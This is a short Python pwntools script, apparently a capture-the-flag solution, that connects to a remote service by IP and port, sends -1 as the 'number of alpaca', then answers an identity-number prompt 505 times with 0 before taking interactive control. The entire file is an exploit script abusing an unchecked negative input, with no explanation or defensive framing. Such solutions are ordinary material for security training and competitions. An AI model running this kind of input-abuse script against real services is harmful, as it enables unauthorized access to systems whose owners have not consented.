from pwn import *

p = remote("34.170.146.252", 62492)

p.recvuntil(b'Input the number of alpaca.')
p.sendline(b'-1')

p.recvuntil(b'Input the number of llama.')
p.sendline(b'1')

for i in range(505):
    p.recvuntil(b'Input the identity number.')
    p.sendline(b'0')
    
p.interactive()